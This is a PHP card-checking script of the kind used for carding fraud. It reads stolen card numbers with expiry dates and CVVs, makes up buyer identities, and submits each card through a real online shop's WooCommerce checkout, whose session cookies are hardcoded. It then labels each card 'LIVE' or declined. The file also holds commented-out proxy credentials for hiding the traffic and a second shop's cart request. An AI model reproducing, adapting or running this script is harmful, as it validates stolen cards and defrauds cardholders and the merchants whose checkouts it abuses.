<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);
$binn = substr($cc,0,6);



if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }

If(strlen($ano) > 2)
{
  $ano = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $apellido).rand(0000,9999)."@hotmail.com";
  return $email;
}
 function ibuuproxy(){
  $proxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($proxySocks)-1);
   $proxySocks = $proxySocks[$myproxy];
 return $proxySocks;
}


///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($apellido);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$username = 'lum-customer-hl_7873c611-zone-static_res';
$password = 'p8txkzc6mq9h';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);


// echo $binn;



$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);


#req1==============================================================================
// function updatecart(){
//
//
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://www.artofhearing.com.au/online-shop/test-2/');
// curl_setopt($ch, CURLOPT_HEADER, 0);
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
//    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
// 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
// 'Accept-Encoding: gzip, deflate, br',
// 'Accept-Language: en-US,en;q=0.9',
// 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
// 'Cookie: landing_page=https%3A%2F%2Fwww.artofhearing.com.au%2F; psn_atf=1; external_referral_site=https%3A%2F%2Fwww.artofhearing.com.au%2F; soundestID=20200605030326-WwmAJQN65GxQ6WcWK06UGlh7gbJ4Q8bw8wUHWsFscOG9LD8B0; omnisendAnonymousID=ICTwJJ3E5Jc1DG-20200605030326; tk_ai=woo%3AOKpJ%2BkfjVqAD9gwdRz527Bb3; wp_woocommerce_session_32f5003ec3b6d66ccbe7ba41cc09cc9d=94ecc6e78c59725a1f42e754c62e73c6%7C%7C1591499073%7C%7C1591495473%7C%7Cf64db11e102bd77c91b41ea9198bb484; omnisendSessionID=TNf8YazO3LSBuh-20200605171554; pre_submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2F; submission_page=https%3A%2F%2Fwww.artofhearing.com.au%2Fonline-shop%2Ftest-2%2Fui.js; soundest-views=36',
// 'Host: www.artofhearing.com.au',
// 'Origin: https://www.artofhearing.com.au',
// 'Referer: https://www.artofhearing.com.au/online-shop/test-2/',
// 'user-agent: '.$browser.''
// ));
//
// curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary1PrEDSO8bvXH5drn
// Content-Disposition: form-data; name="quantity"
//
// 1
// ------WebKitFormBoundary1PrEDSO8bvXH5drn
// Content-Disposition: form-data; name="add-to-cart"
//
// 8265
// ------WebKitFormBoundary1PrEDSO8bvXH5drn--');
//
//
// $b_pago = curl_exec($ch);
// }
// #==========================================================================================================



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://retail.sujikim.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
 // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: PHPSESSID=d1219aa134ffece5f667bbe011b42aae; woocommerce_items_in_cart=1; wp_woocommerce_session_b643725812b33c264fd0a55c474b059e=0fc2fc26d547cbc5195e89e136ca2cf4%7C%7C1591557563%7C%7C1591553963%7C%7Ccd86bdbe08dee9dd331f45e2a5ad436f; woocommerce_cart_hash=669638fbe5eb1d0760129ac2be47ada8; wfvt_2356798933=5edb596cc70c2; wordfence_verifiedHuman=c885d58562c4830247ea736129a75da5',
'origin: https://retail.sujikim.com',
'referer: https://retail.sujikim.com/checkout/',
'user-agent: '.$browser.''
));

curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=&billing_city=Harris+Park&billing_state=NSW&billing_postcode=2150&billing_phone=5182641524&billing_email=vvarner3%40gmail.com&store_pickup=option_3&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=24+moo+4+tambol+Pluakdaeng&shipping_address_2=&shipping_city=Harris+Park&shipping_state=&shipping_postcode=2150&order_comments=&shipping_method%5B0%5D=flat_rate%3A3&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&_wpnonce=e4ff7a814e&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');



$result = curl_exec($ch);



 $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>Payment failed: ','<\/li>\n\t<\/ul>\n"')));
// // // // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));

// // // // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));

// // // // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));


 if(strpos($result,'"result":"success"')){
   updatecart();

    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';


   }
elseif(strpos($result,'Insufficient Funds')){
  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
   }
else {

       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';

}

curl_close($ch);
ob_flush();
   // echo $result;
 // echo $c_pago;
?>
